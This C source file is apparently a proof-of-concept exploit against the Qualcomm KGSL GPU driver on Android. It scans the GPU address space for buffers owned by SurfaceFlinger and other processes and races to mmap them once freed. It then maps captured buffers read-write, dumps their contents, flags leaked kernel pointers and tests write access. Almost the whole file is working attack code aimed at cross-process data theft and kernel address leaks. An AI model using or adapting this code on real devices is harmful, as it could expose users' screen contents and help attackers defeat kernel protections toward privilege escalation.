/*
 * surfaceflinger_gpu_monitor.c - SurfaceFlinger GPU Buffer Hunter
 *
 * Strategy:
 * 1. SurfaceFlinger is always running and uses GPU heavily
 * 2. Monitor KGSL address space for buffers belonging to other processes
 * 3. Use ERANGE detection to identify "occupied" addresses
 * 4. Race to mmap freed addresses when SF releases buffers
 * 5. Analyze buffer contents for framebuffer/command buffer signatures
 *
 * Key Insight from previous testing:
 * - ERANGE = buffer exists but belongs to another process
 * - We can detect which addresses are in use
 * - When SF frees a buffer, we might catch it before recycling
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <dirent.h>

/* KGSL Definitions */
struct kgsl_gpuobj_alloc
{
    uint64_t size;
    uint64_t flags;
    uint64_t va_len;
    uint64_t mmapaddr;
    uint64_t id;
    uint64_t metadata_len;
    uint64_t metadata;
};

struct kgsl_gpuobj_free
{
    uint64_t flags;
    uint64_t priv;
    uint32_t id;
    uint32_t type;
    uint32_t len;
};

#define KGSL_IOC_TYPE 0x09
#define IOCTL_KGSL_GPUOBJ_ALLOC \
    _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPUOBJ_FREE \
    _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

/* Monitoring state */
static volatile int g_running = 1;
static int g_kgsl_fd = -1;

/* Address tracking */
#define MAX_TRACKED 4096
static struct
{
    uint64_t addr;
    int state; // 0=free, 1=ERANGE(other), 2=ours, 3=captured!
    time_t last_change;
    uint64_t signature[4];
} tracked_addrs[MAX_TRACKED];
static int num_tracked = 0;

/* Captured buffers */
#define MAX_CAPTURES 64
static struct
{
    uint64_t addr;
    void *mapping;
    size_t size;
    char description[128];
    uint64_t content_hash;
} captures[MAX_CAPTURES];
static int num_captures = 0;

void signal_handler(int sig)
{
    g_running = 0;
}

/* Compute simple hash of buffer content */
uint64_t compute_hash(void *buf, size_t len)
{
    uint64_t hash = 0x14650FB0739D0383ULL;
    uint64_t *ptr = (uint64_t *)buf;
    for (size_t i = 0; i < len / 8; i++)
    {
        hash ^= ptr[i];
        hash = (hash << 13) | (hash >> 51);
        hash *= 0x5851F42D4C957F2DULL;
    }
    return hash;
}

/* Identify buffer content type */
const char *identify_buffer(void *buf, size_t len)
{
    uint32_t *u32 = (uint32_t *)buf;
    uint64_t *u64 = (uint64_t *)buf;

    /* Check for PM4 command signatures */
    if ((u32[0] & 0xF0000000) == 0xC0000000 ||
        (u32[0] & 0xF0000000) == 0x70000000)
    {
        return "GPU_COMMAND_BUFFER";
    }

    /* Check for framebuffer patterns (ARGB, RGBA) */
    int pixel_count = 0;
    for (int i = 0; i < 64 && i * 4 < len; i++)
    {
        uint32_t pixel = u32[i];
        uint8_t a = (pixel >> 24) & 0xFF;
        if (a == 0xFF || a == 0x00)
            pixel_count++;
    }
    if (pixel_count > 48)
    {
        return "FRAMEBUFFER_RGBA";
    }

    /* Check for fence/sync objects */
    for (int i = 0; i < 8 && i * 8 < len; i++)
    {
        if ((u64[i] >> 48) == 0xFFFF)
        {
            return "KERNEL_STRUCTURE";
        }
    }

    /* Check for all zeros (uninitialized) */
    int zero_count = 0;
    for (int i = 0; i < 256 && i * 8 < len; i++)
    {
        if (u64[i] == 0)
            zero_count++;
    }
    if (zero_count > 200)
    {
        return "ZEROED_BUFFER";
    }

    /* Check for repeated pattern (filled buffer) */
    if (u64[0] == u64[1] && u64[1] == u64[2] && u64[0] != 0)
    {
        return "FILLED_PATTERN";
    }

    return "UNKNOWN_DATA";
}

/* Probe an address and classify its state */
int probe_address(int fd, uint64_t addr)
{
    void *mem = mmap(NULL, 0x1000, PROT_READ,
                     MAP_SHARED, fd, addr);

    if (mem == MAP_FAILED)
    {
        if (errno == ERANGE)
        {
            return 1; // Other process's buffer
        }
        return 0; // Not allocated
    }

    /* Success! We can read it */
    munmap(mem, 0x1000);
    return 2; // Accessible
}

/* Attempt to capture a buffer */
int capture_buffer(int fd, uint64_t addr)
{
    if (num_captures >= MAX_CAPTURES)
        return -1;

    void *mem = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                     MAP_SHARED, fd, addr);

    if (mem == MAP_FAILED)
    {
        return -1;
    }

    /* Success! */
    captures[num_captures].addr = addr;
    captures[num_captures].mapping = mem;
    captures[num_captures].size = 0x1000;
    captures[num_captures].content_hash = compute_hash(mem, 0x1000);
    snprintf(captures[num_captures].description, 128,
             "%s", identify_buffer(mem, 0x1000));

    num_captures++;
    return num_captures - 1;
}

/* Find SurfaceFlinger PID */
int find_surfaceflinger_pid(void)
{
    DIR *proc = opendir("/proc");
    if (!proc)
        return -1;

    struct dirent *ent;
    while ((ent = readdir(proc)) != NULL)
    {
        if (ent->d_type != DT_DIR)
            continue;

        int pid = atoi(ent->d_name);
        if (pid <= 0)
            continue;

        char path[256];
        snprintf(path, sizeof(path), "/proc/%d/cmdline", pid);

        FILE *f = fopen(path, "r");
        if (!f)
            continue;

        char cmdline[256];
        memset(cmdline, 0, sizeof(cmdline));
        fread(cmdline, 1, 255, f);
        fclose(f);

        if (strstr(cmdline, "surfaceflinger"))
        {
            closedir(proc);
            return pid;
        }
    }

    closedir(proc);
    return -1;
}

/* Check SurfaceFlinger's FD usage */
void analyze_sf_fds(int sf_pid)
{
    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/fd", sf_pid);

    DIR *dir = opendir(path);
    if (!dir)
    {
        printf("[-] Cannot access SF fds (permission denied)\n");
        return;
    }

    struct dirent *ent;
    int kgsl_count = 0;

    while ((ent = readdir(dir)) != NULL)
    {
        char link_path[512], target[512];
        snprintf(link_path, sizeof(link_path), "%s/%s", path, ent->d_name);

        ssize_t len = readlink(link_path, target, sizeof(target) - 1);
        if (len > 0)
        {
            target[len] = '\0';
            if (strstr(target, "kgsl"))
            {
                kgsl_count++;
            }
        }
    }

    closedir(dir);
    printf("[*] SurfaceFlinger (PID %d) has %d KGSL FDs\n", sf_pid, kgsl_count);
}

/* Continuous monitoring loop */
void monitor_loop(int duration_sec)
{
    printf("\n=== Starting Continuous Monitor (duration: %ds) ===\n", duration_sec);

    time_t start = time(NULL);
    int scan_count = 0;
    int state_changes = 0;

    /* Initial scan of address space */
    printf("[*] Initial address space scan...\n");

    for (uint64_t addr = 0x1000; addr < 0x100000; addr += 0x1000)
    {
        int state = probe_address(g_kgsl_fd, addr);

        if (state > 0)
        {
            tracked_addrs[num_tracked].addr = addr;
            tracked_addrs[num_tracked].state = state;
            tracked_addrs[num_tracked].last_change = time(NULL);
            num_tracked++;

            if (num_tracked >= MAX_TRACKED)
                break;
        }
    }

    printf("[+] Tracking %d active addresses\n", num_tracked);

    /* Continuous monitoring */
    while (g_running && (time(NULL) - start) < duration_sec)
    {
        scan_count++;

        /* Check existing tracked addresses */
        for (int i = 0; i < num_tracked; i++)
        {
            int new_state = probe_address(g_kgsl_fd, tracked_addrs[i].addr);

            if (new_state != tracked_addrs[i].state)
            {
                state_changes++;

                printf("[!] State change at 0x%05llx: %d -> %d\n",
                       (unsigned long long)tracked_addrs[i].addr,
                       tracked_addrs[i].state, new_state);

                /* If it became accessible, try to capture! */
                if (new_state == 2 && tracked_addrs[i].state == 1)
                {
                    printf("    [+] Attempting capture...\n");
                    int cap = capture_buffer(g_kgsl_fd, tracked_addrs[i].addr);
                    if (cap >= 0)
                    {
                        printf("    [+] CAPTURED! Type: %s\n",
                               captures[cap].description);
                        tracked_addrs[i].state = 3; // Mark as captured
                    }
                }

                tracked_addrs[i].state = new_state;
                tracked_addrs[i].last_change = time(NULL);
            }
        }

        /* Look for new addresses */
        for (uint64_t addr = 0x1000; addr < 0x200000; addr += 0x1000)
        {
            /* Skip already tracked */
            int found = 0;
            for (int i = 0; i < num_tracked; i++)
            {
                if (tracked_addrs[i].addr == addr)
                {
                    found = 1;
                    break;
                }
            }
            if (found)
                continue;

            int state = probe_address(g_kgsl_fd, addr);
            if (state > 0 && num_tracked < MAX_TRACKED)
            {
                printf("[+] New address detected: 0x%05llx (state=%d)\n",
                       (unsigned long long)addr, state);

                tracked_addrs[num_tracked].addr = addr;
                tracked_addrs[num_tracked].state = state;
                tracked_addrs[num_tracked].last_change = time(NULL);
                num_tracked++;
            }
        }

        usleep(10000); // 10ms between scans

        /* Progress update */
        if (scan_count % 100 == 0)
        {
            printf("[*] Scan %d: tracked=%d, changes=%d, captures=%d\n",
                   scan_count, num_tracked, state_changes, num_captures);
        }
    }

    printf("\n[*] Monitor stopped after %ld seconds\n", time(NULL) - start);
    printf("    Scans: %d\n", scan_count);
    printf("    State changes: %d\n", state_changes);
    printf("    Captures: %d\n", num_captures);
}

/* Analyze captured buffers */
void analyze_captures(void)
{
    if (num_captures == 0)
    {
        printf("\n[-] No buffers captured\n");
        return;
    }

    printf("\n=== Captured Buffer Analysis ===\n");

    for (int i = 0; i < num_captures; i++)
    {
        printf("\n[%d] Address: 0x%05llx\n", i,
               (unsigned long long)captures[i].addr);
        printf("    Type: %s\n", captures[i].description);
        printf("    Hash: 0x%016llx\n", (unsigned long long)captures[i].content_hash);

        /* Hexdump first 64 bytes */
        printf("    Data:\n");
        uint8_t *p = (uint8_t *)captures[i].mapping;
        for (int row = 0; row < 4; row++)
        {
            printf("      %04x: ", row * 16);
            for (int col = 0; col < 16; col++)
            {
                printf("%02x ", p[row * 16 + col]);
            }
            printf("\n");
        }

        /* Check for kernel pointers */
        uint64_t *p64 = (uint64_t *)captures[i].mapping;
        for (int j = 0; j < 512; j++)
        {
            if ((p64[j] >> 48) == 0xFFFF)
            {
                printf("    [!] KERNEL POINTER at +0x%03x: 0x%016llx\n",
                       j * 8, (unsigned long long)p64[j]);
            }
        }
    }
}

/* Attempt write to captured buffer */
void test_write_capability(void)
{
    if (num_captures == 0)
        return;

    printf("\n=== Testing Write Capability ===\n");

    for (int i = 0; i < num_captures; i++)
    {
        uint64_t *ptr = (uint64_t *)captures[i].mapping;
        uint64_t original = ptr[0];
        uint64_t test_pattern = 0xDEADBEEF00C0FFEEULL;

        ptr[0] = test_pattern;
        __sync_synchronize();

        if (ptr[0] == test_pattern)
        {
            printf("[+] Buffer %d: WRITABLE!\n", i);
            ptr[0] = original; // Restore
        }
        else
        {
            printf("[-] Buffer %d: Read-only or copy-on-write\n", i);
        }
    }
}

int main(int argc, char **argv)
{
    printf("=== SurfaceFlinger GPU Buffer Monitor ===\n\n");

    /* Set up signal handler */
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    /* Find SurfaceFlinger */
    int sf_pid = find_surfaceflinger_pid();
    if (sf_pid > 0)
    {
        printf("[+] SurfaceFlinger PID: %d\n", sf_pid);
        analyze_sf_fds(sf_pid);
    }
    else
    {
        printf("[*] SurfaceFlinger not found (continuing anyway)\n");
    }

    /* Open KGSL */
    g_kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (g_kgsl_fd < 0)
    {
        perror("[-] Failed to open KGSL");
        return 1;
    }
    printf("[+] KGSL fd: %d\n", g_kgsl_fd);

    /* Parse duration argument */
    int duration = 60; // Default 60 seconds
    if (argc > 1)
    {
        duration = atoi(argv[1]);
        if (duration <= 0)
            duration = 60;
    }
    printf("[*] Monitor duration: %d seconds\n", duration);
    printf("[*] Press Ctrl+C to stop early\n");

    /* Run monitor */
    monitor_loop(duration);

    /* Analyze results */
    analyze_captures();
    test_write_capability();

    /* Cleanup captured mappings */
    for (int i = 0; i < num_captures; i++)
    {
        if (captures[i].mapping)
        {
            munmap(captures[i].mapping, captures[i].size);
        }
    }

    close(g_kgsl_fd);

    printf("\n=== Done ===\n");
    return 0;
}
